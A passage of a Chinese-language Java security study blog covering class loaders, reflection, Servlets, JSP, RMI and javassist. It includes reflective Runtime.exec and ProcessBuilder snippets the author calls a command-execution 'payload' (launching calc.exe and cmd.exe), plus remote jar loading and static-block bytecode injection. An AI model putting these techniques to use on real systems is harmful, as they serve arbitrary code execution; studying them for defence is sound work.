116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 5, 104, 101, 108, 108, 111, 1, 0, 20, 40, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 19, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 46, 106, 97, 118, 97, 12, 0, 5, 0, 6, 1, 0, 12, 72, 101, 108, 108, 111, 32, 87, 111, 114, 108, 100, 126, 1, 0, 40, 99, 111, 109, 47, 97, 110, 98, 97, 105, 47, 115, 101, 99, 47, 99, 108, 97, 115, 115, 108, 111, 97, 100, 101, 114, 47, 84, 101, 115, 116, 72, 101, 108, 108, 111, 87, 111, 114, 108, 100, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 0, 33, 0, 3, 0, 4, 0, 0, 0, 0, 0, 2, 0, 1, 0, 5, 0, 6, 0, 1, 0, 7, 0, 0, 0, 29, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 1, -79, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 7, 0, 1, 0, 9, 0, 10, 0, 1, 0, 7, 0, 0, 0, 27, 0, 1, 0, 1, 0, 0, 0, 3, 18, 2, -80, 0, 0, 0, 1, 0, 8, 0, 0, 0, 6, 0, 1, 0, 0, 0, 10, 0, 1, 0, 11, 0, 0, 0, 2, 0, 12&#125;; &#x2F;&#x2F;这部分是类字节码，是我从别人那里嫖的 @Override protected Class&lt;?&gt; findClass(String name) throws ClassNotFoundException &#123; if(name.equals(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;))&#123; return defineClass(testClassName,testClassBytes,0,testClassBytes.length); &#125; else&#123; return super.findClass(name); &#125; &#125;&#125; 然后主函数我们写 public static void main(String[] args) &#123; try &#123; TestClassLoader Loader &#x3D; new TestClassLoader(); Class clazz &#x3D; Loader.loadClass(&quot;com.anbai.sec.classloader.TestHelloWorld&quot;); Object Instance &#x3D; clazz.newInstance(); Method method &#x3D; Instance.getClass().getMethod(&quot;hello&quot;); String str &#x3D; (String) method.invoke(Instance); System.out.println(str); &#125;catch (Exception e)&#123;&#125;&#125; 经测试程序正常运行。我们的自定义ClassLoader就写好了。当然还有更多花里胡哨的重写方法，我们这里只是知道怎么重写即可。 URLClassLoaderURLClassLoader也是ClassLoader类下的一个重写类。这个类很好用，它可以通过网络协议获取远程的jar包，然后通过类加载器去获得其中的指定类的类对象。试试吧。 流程是先定义一个URL对象指向我们的jar包，然后实例化一个URLClassLoader对象，然后通过loadClass加载某个类获得类对象。 import java.lang.reflect.Field;import java.lang.reflect.Method;import java.net.URL;import java.net.URLClassLoader;public class test &#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F; Class clazz &#x3D; ClassLoader.getSystemClassLoader().loadClass(&quot;fuck&quot;);&#x2F;&#x2F; Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class);&#x2F;&#x2F; method.invoke(clazz.newInstance(),123); URL url &#x3D; new URL(&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;LOL.jar&quot;); URLClassLoader Loader &#x3D; new URLClassLoader(new URL[]&#123;url&#125;); Class clazz &#x3D; Loader.loadClass(&quot;fuck&quot;); Method method &#x3D; clazz.getMethod(&quot;func1&quot;,int.class); method.setAccessible(true); method.invoke(clazz.newInstance(),123); &#125; catch (Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 然后我们jar包里的class是这个.JAVA的编译文件 public class fuck&#123; public void func1(int input1)&#123; System.out.print(input1); &#125;&#125; 执行结果 反射反射的基础反射是java的一个特性，用于获取类的详细信息（方法，变量），并可以执行类中的方法。 获得一个类的类对象要获取类的详细信息或执行其中的方法，首先肯定是要获取到那个类的类对象 方法一:我们需要创建一个Class类型的变量，用于接收Class.forname(“类”)返回的类对象。这个方法必须通过try..catch 来处理其中ClassNotFoundException try&#123;Class clazz &#x3D; Class.forname(&quot;java.lang.String&quot;)；&#125;catch(ClassNotFoundException e)&#123;&#125; 方法二:我们实例化一个类的对象出来，然后通过 对象.getClass()获得其类对象 String a &#x3D; new String;Class clazz &#x3D; a.getclass(); 方法三:使用.class Class clazz &#x3D; String.class; 这样，我们就获得一个指定类的类对象了。很简单。我们可以对一个类对象使用getName()方法获取其类名。 System.out.println(clazz.getName()); 获取一个类对象的所有成员获取属性并修改对类对象使用 getFields() 或 getDeclaredFields() 方法即可获得属性数组，区别在于前者只能获取公有属性，后者能获取私有属性。然后遍历属性数组，通过对每一项执行getName()获取属性名，get(实例化的对象)获得属性值然后对某一项进行.set()对其进行修改这里需要提的是，如果要获得或修改私有属性的值的时候，需要对私有属性使用setAccessible(true)来实现私有访问 import java.lang.reflect.Field;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); abc test &#x3D; new abc(); Field[] Fields &#x3D; clazz.getDeclaredFields(); for(Field Field:Fields)&#123; &#x2F;&#x2F;遍历Fields数组 try &#123; &#x2F;&#x2F;执行get()方法时需抛出IllegalAccessException错误 Field.setAccessible(true); &#x2F;&#x2F;对数组中的每一项实现私有访问 System.out.print(Field.getName()); Object value &#x3D; Field.get(new abc()); System.out.println(&quot;:&quot; + value); Field.set(test,&quot;new&quot;); &#x2F;&#x2F;修改test对象中的变量 &#125; catch (Exception e)&#123; &#125; &#125; System.out.println(test.a); &#125;&#125;class abc&#123; public String a &#x3D;new String(&quot;tom and mary&quot;); private String b &#x3D; new String(&quot;abcdefg&quot;);&#125; 运行结果 另外，你也可以通过getFiled(“属性名”)来获取特定属性的Filed对象， getDeclaredFields() 同理 获取方法并执行接下来是获取方法的一些信息我们通过getMethod获取方法对象，然后通过getName获取方法名，getReturnType获取返回值类型，getParameterTypes获取传入的参数类型 import java.lang.reflect.Field;import java.lang.reflect.Method;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); Method[] methods &#x3D; clazz.getDeclaredMethods(); for(Method method:methods)&#123; try&#123; System.out.print(method.getName()); System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;); Class[] ParameterTypes &#x3D; method.getParameterTypes(); for(Class ParameterType:ParameterTypes)&#123; System.out.print(&quot;ParamType:&quot;+ParameterType.getName()); &#125; System.out.println(&quot;&quot;); &#125; catch (Exception e)&#123; &#125; &#125; &#125;&#125;class abc&#123; public int a &#x3D;1; private String b &#x3D; new String(&quot;abcdefg&quot;); public void func1(int input1)&#123; System.out.print(input1); &#125; private void func2(int input1)&#123; System.out.print(input1); &#125;&#125; 接下来是对method对象执行invoke方法调用，通过传入参数，指定对象，即可调用该方法。我在上述代码中添加了修改 import java.lang.reflect.Field;import java.lang.reflect.Method;public class test &#123; public static void main(String[] args)&#123; Class clazz &#x3D; (new abc()).getClass(); Method[] methods &#x3D; clazz.getDeclaredMethods(); for(Method method:methods)&#123; try&#123; System.out.print(method.getName()); System.out.print(&quot;|retrunType:&quot;+method.getReturnType()+&quot;|&quot;); Class[] ParameterTypes &#x3D; method.getParameterTypes(); for(Class ParameterType:ParameterTypes)&#123; System.out.print(&quot;ParamType:&quot;+ParameterType.getName()); &#125; System.out.println(&quot;&quot;); method.setAccessible(true); &#x2F;&#x2F;打开私有访问 method.invoke(new abc(),2); &#x2F;&#x2F;new 这里invoke第一个参数指定实例化对象，之后的参数代表传入方法的参数 &#125; catch (Exception e)&#123; &#125; &#125; &#125;&#125;class abc&#123; public int a &#x3D;1; private String b &#x3D; new String(&quot;abcdefg&quot;); public void func1(int input1)&#123; System.out.print(input1); &#125; private void func2(int input1)&#123; System.out.print(input1); &#125;&#125; 获取构造方法并执行获得构造方法，主要是通过 getConstructors()和getDeclaredConstructors() ，后者能访问私有对象,下面是用遍历法获得所有构造函数信息 import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; try&#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;); Constructor[] conArray &#x3D; clazz.getDeclaredConstructors(); for (Constructor a:conArray)&#123; a.setAccessible(true); System.out.println(a); &#125; &#125; catch(Exception e)&#123; &#125; &#125;&#125;class abc&#123; public abc(String name,int age)&#123; System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age); &#125; private abc(int age)&#123; System.out.println(&quot;私有的构造方法 年龄：&quot;+ age); &#125;&#125; 运行结果 我们刚才提过,getFiled()附带参数可以指定访问某一个属性，同理，getConstructor也一样，我们想要执行某一个类的构造方法，往往这个方法更实用要执行一个类的构造方法，那我们需要创建一个该类的实例化对象，这个过程我们用newInstance()方法实现 import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; try&#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;); Constructor test &#x3D; clazz.getDeclaredConstructor(int.class); &#x2F;&#x2F;指定参数，即可从多个重载的构造函数指定到某个具体的构造函数 test.setAccessible(true); test.newInstance(12); &#x2F;&#x2F;私有构造方法只需调用一下newInstance传入参数即可 Constructor test2 &#x3D; clazz.getDeclaredConstructor(String.class,int.class); test2.newInstance(&quot;tom&quot;,15); &#x2F;&#x2F;公有构造方法也一样 &#125; catch(Exception e)&#123; &#125; &#125;&#125;class abc&#123; public abc(String name,int age)&#123; System.out.println(&quot;姓名：&quot;+name+&quot;年龄：&quot;+ age); &#125; private abc(int age)&#123; System.out.println(&quot;私有的构造方法 年龄：&quot;+ age); &#125;&#125; 执行结果 反射的进阶与安全Class.forName 实质与类初始化Class.forName(“…”) 常被我们拿来获得类对象，但是实际上，Class.forname有三个参数，只不过我们默认输第一个参数：类名就能完成工作了。 这是Class.fornName函数原型public static Class&lt;?&gt; forName(String name, boolean initialize, ClassLoader loader)Class.forName(className)&#x2F;&#x2F; 等于Class.forName(className, true, currentLoader) 这里我们看见有三个参数，第一个参数是指定类名就不多讲了，第二个参数是决定类是否初始化（这个稍后会详细阐明），第三个是ClassLoader类加载器（告诉JVM如何加载这个类这里不展开说） 关于一个类的初始化，有三种操作可以实现:构造方法，空块和static块，就像这样 public class TrainPrint &#123; &#123; System.out.printf(&quot;Empty block initial %s\\n&quot;, this.getClass()); &#125; static &#123; System.out.printf(&quot;Static initial %s\\n&quot;, TrainPrint.class); &#125; public TrainPrint() &#123; System.out.printf(&quot;Initial %s\\n&quot;, this.getClass()); &#125;&#125; 那么执行顺序是如何呢，在引入父类的情况下又是如何呢？我们写个demo看看 import java.lang.reflect.Constructor;public class test &#123; public static void main(String[] args)&#123; abc a &#x3D; new abc(); &#125;&#125;class b&#123; &#123; System.out.println(&quot;b空块已执行&quot;); &#125; static&#123; System.out.println(&quot; b static块已执行&quot;); &#125; public b()&#123; System.out.println(&quot;b类构造方法已执行&quot;); &#125;&#125;class abc extends b&#123; &#123; System.out.println(&quot;a空块已执行&quot;); &#125; static&#123; System.out.println(&quot; a static块已执行&quot;); &#125; public abc() &#123; System.out.println(&quot;a初始化方法已执行&quot;); &#125;&#125; 我们可以清晰的看到执行顺序，对继承类来说，1.会先执行父类static块2.执行自己的static块3.执行父类空快4.执行父类构造方法5.执行自己空快6.执行自己构造方法 对于一个类来说，执行顺序则是1.执行static块2.执行空快3.执行构造方法 那么对于Class.forName指定的是否进行类初始化参数，指的是哪个部分？static块，空块还是构造方法?答案是只会执行static块里的，且会优先执行父类的static块。我们把上面代码中的主函数替换为 try &#123; Class clazz &#x3D; Class.forName(&quot;abc&quot;);&#125;catch (Exception e)&#123;&#125; 执行一下，看结果。发现只执行了static块 也就是说，Class.forName()会默认执行类的static代码块，是个比较危险的信号。另外一提，xxx.class.newinstance() 会自动调用类的构造方法。 Runtime执行命令解析一般来说，我们调用Runtime类来执行命令时的指定是这样的 Runtime.getRuntime().exe() 我们到源码里分析这段代码 可见，当我们对Runtime类执行getRuntime()时会得到一个Runtime对象，然后我们就可以调用我们的exec方法了同时，Runtime() 被private修饰符修饰了，这说明我们无法通过Runtime a = new Runtime()来实现一个Runtime的对象。所以说，我们正常地使用runtime来执行命令只能依靠以上代码。 那么我们要是想要依靠反射来写一个Runtime执行任意命令的payload，那么该如何写呢？ 先来一个错误示范，当我们用常规的思路去实现时。我们直接调用Runtime类里的exec方法，然后通过newInstance来实例化一个Runtime对象 Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);Method method &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);method.setAccessible(true);method.invoke(clazz.newInstance(),&quot;calc.exe&quot;); 最终结果则是报错：class test cannot access a member of class java.lang.Runtime (in module java.base) with modifiers “private”看来通过反射也不能直接调用exec方法，或者说不能实例化Runtime对象。那么正确思路该是什么呢？应该是先调用getRuntime获得Runtime对象，然后再调用exec方法 Class clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);Method MgetRuntime &#x3D; clazz.getMethod(&quot;getRuntime&quot;);Object runtime &#x3D; MgetRuntime.invoke(clazz); &#x2F;&#x2F;对类对象使用getRuntime(),其实就相当于Runtime.getRuntime()。这种方式仅限static方法Method Mexec &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);Mexec.invoke(runtime,&quot;calc.exe&quot;); 最终弹出计算器。 ProcessBuilder执行命令的反射实现除了Runtime以外，还可以用ProcessBuilder类来执行命令。它的正常情况使用如下. ProcessBuilder pb &#x3D; new ProcessBuilder(&quot;calc.exe&quot;);pb.start(); 我们来分析一下ProcessBuilder的构造方法，它的构造方法有很多个重载，我们分析一个吧。 可见，ProcessBuilder的构造方法把传入参数保存到了command属性里，然后commad会被以系统命令调用（这部分代码就不贴出来了）。 那么以反射的形式该如何实现呢。 Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;); Method start &#x3D; clazz.getMethod(&quot;start&quot;); start.invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(&quot;cmd.exe&quot;))); ServletServlet生命周期1.调用init()方法进行初始化init()方法在第一次创建servlet时被调用，用于进行初始化操作。 public void init() throws ServletException&#123;...code...&#125; 2.调用service()方法处理客户端请求web服务器，即servlet容器调用service()方法处理来自客户端的请求，并返回响应。同时根据客户端请求的类型（Get，Post，delete等），做出不同的行为，这些行为是由service方法抽象出的其他方法（doGet，doPost等）。所以这里说的调用service()方法也就是等同于调用doGet，doPost等方法。 doPost,doDelete等方法的定义形同于下public void doGet(HttpServletRequest request,HttpServletResponse response) throws ServletException,IOException&#123;...code...&#125; 3.调用distroy()在Servlet销毁前完成清理活动distrtoy()函数只调用一次，在Servlet被销毁前完成后台线程停止，数据库链接关闭等一系列清理工作。 public void destroy() &#123; &#x2F;&#x2F; 终止化代码...&#125; 编写一个简单的Servlet我们写一个程序，用来控制Get请求的响应 import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;) &#x2F;&#x2F;用于设定路由public class test extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); out.println(&quot;&lt;h1&gt;&quot; + &quot;a&quot; + &quot;&lt;&#x2F;h1&gt;&quot;); &#125;&#125; 至于部署我是参考的这个文章https://blog.csdn.net/gaoqingliang521/article/details/108677301我的版本时idea 2020.2，可能会有出入。 处理传参servlet处理传参主要是通过doGet和doPost方法进行的。接收参数值主要是靠下面的方法 getParameter()：您可以调用 request.getParameter() 方法来获取表单参数的值。 getParameterValues()：如果参数出现一次以上，则调用该方法，并返回多个值，例如复选框。 getParameterNames()：如果您想要得到当前请求中的所有参数的完整列表，则调用该方法。 我们写个demo试试 import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; @Override public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); String name &#x3D; new String(request.getParameter(&quot;name&quot;)); out.println(&quot;your name is &quot;+name); &#125;&#125; 这个demo主要用于接收get数据，并做出一些处理返回.那么如何接收POST数据呢？和doGet差不多 import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; response.setContentType(&quot;text&#x2F;html&quot;); PrintWriter out &#x3D; response.getWriter(); String name &#x3D; new String(request.getParameter(&quot;name&quot;)); out.println(&quot;[Post]your name is &quot;+name); &#125;&#125;需要注意的是，这里的request.getParameter(&quot;name&quot;)会优先选择在url里的参数，而不是http包体的参数 cookie&amp;sessioncookiecookie的主要方法如下 序号 方法 &amp; 描述 1 public void setDomain(String pattern) 该方法设置 cookie 适用的域，例如 runoob.com。 2 public String getDomain() 该方法获取 cookie 适用的域，例如 runoob.com。 3 public void setMaxAge(int expiry) 该方法设置 cookie 过期的时间（以秒为单位）。如果不这样设置，cookie 只会在当前 session 会话中持续有效。 4 public int getMaxAge() 该方法返回 cookie 的最大生存周期（以秒为单位），默认情况下，-1 表示 cookie 将持续下去，直到浏览器关闭。 5 public String getName() 该方法返回 cookie 的名称。名称在创建后不能改变。 6 public void setValue(String newValue) 该方法设置与 cookie 关联的值。 7 public String getValue() 该方法获取与 cookie 关联的值。 8 public void setPath(String uri) 该方法设置 cookie 适用的路径。如果您不指定路径，与当前页面相同目录下的（包括子目录下的）所有 URL 都会返回 cookie。 9 public String getPath() 该方法获取 cookie 适用的路径。 10 public void setSecure(boolean flag) 该方法设置布尔值，表示 cookie 是否应该只在加密的（即 SSL）连接上发送。 11 public void setComment(String purpose) 设置cookie的注释。该注释在浏览器向用户呈现 cookie 时非常有用。 12 public String getComment() 获取 cookie 的注释，如果 cookie 没有注释则返回 null。 我们马上写一个demo，这个demo会用到 response.addCookie用于在响应头里添加cookie，cookie.setMaxAge 用于设置cookie的有效期，request.getCookies 用于获取请求里的cookie数组这里的demo有两个，一个用于添加cookie，一个用于输出cookie 用于添加cookieimport javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; Cookie name &#x3D; new Cookie(&quot;name&quot;, request.getParameter(&quot;name&quot;)); &#x2F;&#x2F; 中文转码 name.setMaxAge(60*60*24); response.addCookie( name ); &#125;&#125;输出cookie值import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;@WebServlet(&quot;&#x2F;b&quot;)public class test2 extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; Cookie cookie &#x3D; null; Cookie[] cookies &#x3D; null; &#x2F;&#x2F; 获取与该域相关的 Cookie 的数组 cookies &#x3D; request.getCookies(); &#x2F;&#x2F; 设置响应内容类型 response.setContentType(&quot;text&#x2F;html;charset&#x3D;UTF-8&quot;); PrintWriter out &#x3D; response.getWriter(); for (int i &#x3D; 0; i &lt; cookies.length; i++)&#123; if((cookies[i].getName()).compareTo(&quot;name&quot;)&#x3D;&#x3D;0)&#123; out.println(&quot;your name is &quot;+cookies[i].getValue()); &#125; &#125; &#125;&#125; sessionservle提供了一系列session接口辅助这个流程 1 public Object getAttribute(String name) 该方法返回在该 session 会话中具有指定名称的对象，如果没有指定名称的对象，则返回 null。 2 public Enumeration getAttributeNames() 该方法返回 String 对象的枚举，String 对象包含所有绑定到该 session 会话的对象的名称。 3 public long getCreationTime() 该方法返回该 session 会话被创建的时间，自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。 4 public String getId() 该方法返回一个包含分配给该 session 会话的唯一标识符的字符串。 5 public long getLastAccessedTime() 该方法返回客户端最后一次发送与该 session 会话相关的请求的时间自格林尼治标准时间 1970 年 1 月 1 日午夜算起，以毫秒为单位。 6 public int getMaxInactiveInterval() 该方法返回 Servlet 容器在客户端访问时保持 session 会话打开的最大时间间隔，以秒为单位。 7 public void invalidate() 该方法指示该 session 会话无效，并解除绑定到它上面的任何对象。 8 public boolean isNew() 如果客户端还不知道该 session 会话，或者如果客户选择不参入该 session 会话，则该方法返回 true。 9 public void removeAttribute(String name) 该方法将从该 session 会话移除指定名称的对象。 10 public void setAttribute(String name, Object value) 该方法使用指定的名称绑定一个对象到该 session 会话。 11 public void setMaxInactiveInterval(int interval) 该方法在 Servlet 容器指示该 session 会话无效之前，指定客户端请求之间的时间，以秒为单位。 写个demo吧，过一过就行了 import javax.servlet.*;import javax.servlet.annotation.WebServlet;import javax.servlet.http.*;import java.io.*;import java.text.*;import java.util.*;@WebServlet(&quot;&#x2F;a&quot;)public class test extends HttpServlet &#123; public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException &#123; HttpSession session &#x3D; request.getSession(); &#x2F;&#x2F;创建一个session对象 Date createtime &#x3D; new Date(session.getCreationTime()); Date lastAccessTime &#x3D; new Date(session.getLastAccessedTime()); PrintWriter out &#x3D; response.getWriter(); SimpleDateFormat df &#x3D; new SimpleDateFormat(&quot;yyyy-MM-dd:mm:ss&quot;); String countkey &#x3D; new String(&quot;key&quot;); &#x2F;&#x2F;访问次数的键 Integer count &#x3D; Integer.valueOf(0); &#x2F;&#x2F;访问次数的值 String userID &#x3D; new String(&quot;Tom&quot;); &#x2F;&#x2F;用户ID的值 String userIDKey &#x3D; new String(&quot;userIDKey&quot;); &#x2F;&#x2F;用户ID的键 if(session.getAttribute(countkey)&#x3D;&#x3D;null)&#123; &#x2F;&#x2F;如果获得该session的countkey这个键的值不存在时，为当前session初始化这个键 session.setAttribute(countkey,Integer.valueOf(0)); &#125; if(session.isNew())&#123; &#x2F;&#x2F;如果session是第一次创建，则为其初始化userID键 session.setAttribute(userIDKey,userID); &#125; else&#123; count &#x3D; (Integer) session.getAttribute(countkey); count &#x3D; count+1; userID &#x3D; (String)session.getAttribute(userIDKey); &#125; session.setAttribute(countkey,count); out.println(&quot;hello&quot;+userID+&quot;\\nthis is the &quot;+count+&quot; to visit this website\\n&quot;); out.println(&quot;first time:&quot;+createtime+&quot;\\n this time:&quot;+lastAccessTime); &#125;&#125; JSP概览JSP是脚本语言，与PHP等语言类似。JSP本质就是servlet，它存在的意义就是简化servlet复杂的程序过程 JSP基础语法代码段JSP和PHP等可以嵌入到HTML的脚本语言类似，需要用一个代码段包裹代码。其格式如下 &lt;% code %&gt; 同时在代码段中还存在着指令标签:Page,include,taglib他们的定义和作用如下 &lt;%@ page ...... %&gt; page指令用于定义网页的各属性，如&lt;%@ page import&#x3D;&quot;...&quot; %&gt; 表示要导入哪些java模块,&lt;%@ page language&#x3D;&quot;...&quot; %&gt;表示JSP页面所用的语言，默认是java&lt;%@ include file&#x3D;&quot;文件相对url地址&quot; %&gt; 表示要包含哪些其他文件，可以包含JSP,HTML或txt等文件&lt;%@ taglib ......%&gt; 主要用于用户自定义标签 动作元素与指令元素比较相似，但不同的是动作元素可以动态的插入，不像指令元素一样一开头就会被执行。 九大对象JSP中有九大对象用于实现各种操作。 至于request和response，这俩用的是最多的是他们，out对象主要用于在response中写入输出内容， out.println或者out.print用于输出内容，out.flush用于刷新输出流,其余在新手阶段都不咋用。 传参处理 getParameter(): 使用 request.getParameter() 方法来获取表单参数的值。 getParameterValues(): 获得如checkbox类（名字相同，但值有多个）的数据。 接收数组变量 ，如checkbox类型 **getParameterNames():**该方法可以取得所有变量的名称，该方法返回一个 Enumeration。 **getInputStream():**调用此方法来读取来自客户端的二进制数据流。 &lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;test jsp&lt;&#x2F;title&gt;&lt;&#x2F;head&gt;&lt;body&gt;your name is &lt;%&#x3D;request.getParameter(&quot;name&quot;)%&gt;&lt;&#x2F;body&gt;&lt;&#x2F;html&gt; cookie&amp;sessioncookie，session在JSP里的设置与servlet如出一辙cookie和session在jsp的&lt;%%&gt;代码区里设置，设置方法与servlet如出一辙，因为&lt;%%&gt;代码区里本身就是调用的java代码，所以不再赘述 RMI何为RMIRMI，即远程方法调用，允许运行在一个JAVA虚拟机调用另一个JAVA虚拟机上的对象的方法. RMI:实现一个远程接口RMI的远程接口用于其他java虚拟机远程调用该接口下的对象的方法. 定义一个远程接口import java.rmi.Remote; &#x2F;&#x2F;引入Remote接口public interface IHello extends Remote&#123; &#x2F;&#x2F;实现一个Remote接口 public String sayHello(String name) throws java.rmi.RemoteException;&#x2F;&#x2F;若是Remote接口里某个方法抛出RemoteException异常,就意味着这是一个可以被远程调用的方法,但目前这个方法还未被具体实现.&#125; 远程接口的实现类刚刚我们定义了一个Remote接口,但是他的方法还未具体实现.我们就来实现远程接口的实现类吧 import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class HelloImpl extends UnicastRemoteObject implements IHello&#123; &#x2F;&#x2F;定义一个远程接口实现类,注意这个远程实现类必须继承自UnicastRemoteObject,不然服务端不会发送该类的对象的存根(stub(下文讲)) protected HelloImpl throws RemoteException&#123;&#x2F;&#x2F;必须要有一个抛出RemoteException异常的显示构造函数 super(); &#125; public String sayHello(String name) throws RemoteException&#123; return &quot;Hello&quot;+name; &#x2F;&#x2F;定义实现类方法的具体代码 &#125;&#125; 两台JVM通讯的第一步:RMI Registry何为RMI Registry可以理解为部署在被远程调用的JAVA虚拟机上的一个应用,用于将stub绑定到Registry服务的URL上。 服务端绑定stub到指定url java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;, hello); &#x2F;&#x2F;如此处就是把hello这个对象绑定在了rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello这个URL 随后客户端想要远程调用hello这个对象的方法时，就需 IHello hello &#x3D; (IHello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1099&#x2F;hello&quot;);&#x2F;&#x2F;此刻客户端查找出了hello对象的stub所在url,服务端返回hello对象的Stub&#x2F;&#x2F;此时的数据类型似乎必须是接口类 Stub和Skeleton 由上文可知当客户机远程调用一个对象时,返回的其实不是对象本身,而是stub.你可以理解stub为一个中继站，当客户机调用该对象某个方法时,实际上是通过stub以socket的方式向服务器端的skeleton发送序列化处理的方法名和参数（skeleton可以理解为服务器端上的真实对象)服务端的skeletion反序列化得到的方法名和参数并处理后再以socket的方式把该方法生成的结果传回stub,stub再把数据返回给客户机 代码实现远程调用服务器端import java.rmi.Remote;import java.rmi.registry.*;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;interface Hello extends Remote&#123; public String sayHello(String name) throws RemoteException;&#125;class HelloImpl extends UnicastRemoteObject implements Hello&#123; protected HelloImpl()throws RemoteException &#123; super(); &#125; public String sayHello(String name) throws RemoteException&#123; return &quot;Hello&quot;+name; &#125;&#125;------------------------------------------------------------------public class Server&#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F;必须有try..catch Hello hello &#x3D; new HelloImpl(); &#x2F;&#x2F;似乎数据类型只能是接口类 LocateRegistry.createRegistry(1080); &#x2F;&#x2F;将RMI registry的端口设置为1080 java.rmi.Naming.rebind(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;, hello);&#x2F;&#x2F;将hello这个方法对象绑定在指定url上,rmi协议 System.out.print(&quot;OK&quot;); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125;&#125;&#125;客户机端import java.rmi.Remote;import java.rmi.registry.*;import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;import java.rmi.Naming;public class Client&#123; public static void main(String[] args)&#123; try&#123;&#x2F;&#x2F;必须有try..catch Hello hello_client &#x3D; (Hello) Naming.lookup(&quot;rmi:&#x2F;&#x2F;localhost:1080&#x2F;hello&quot;); &#x2F;&#x2F;服务器端绑定在该url的对象数据类型是Hello，所以这里的数据类型也是Hello System.out.print(hello_client.sayHello(&quot;fuck&quot;)); &#125;catch(Exception e)&#123; e.printStackTrace(); &#125; &#125;&#125; 结果 javassistjavassist 是一个类库，用于操作java字节码。 比如我们接下来就会使用javassist来动态操作字节码。 test2.javapublic class test2 &#123; public void gogo()&#123; System.out.println(&quot;yuansheng&quot;); &#125;&#125;test1.javaimport javassist.*;public class test1 &#123; public static void main(String[] args) throws Exception&#123; ClassPool pool &#x3D; ClassPool.getDefault(); CtClass class1 &#x3D; pool.get(test2.class.getName()); String cmd &#x3D; &quot;System.out.print(\\&quot;hello\\&quot;);&quot;; class1.makeClassInitializer().insertBefore(cmd); \\\\插入static静态代码块，内容为cmd中内容 class1.setName(&quot;class1&quot;); \\\\为新类命名为class1 class1.writeFile(&quot;d:\\\\test&quot;); \\\\将类写入d:\\\\test文件夹 &#125;&#125; 反编译d:\\\\test\\\\class1.class &#x2F;&#x2F;&#x2F;&#x2F; Source code recreated from a .class file by IntelliJ IDEA&#x2F;&#x2F; (powered by FernFlower decompiler)&#x2F;&#x2F;public class class1 &#123; public class1() &#123; &#125; public void gogo() &#123; System.out.println(&quot;yuansheng&quot;); &#125; static &#123; System.out.print(&quot;hello&quot;); &#125;&#125; 发现我们已经往test2.java的内容中插入了输出hello的静态代码块，并以class1.class写入d:\\\\test文件夹。 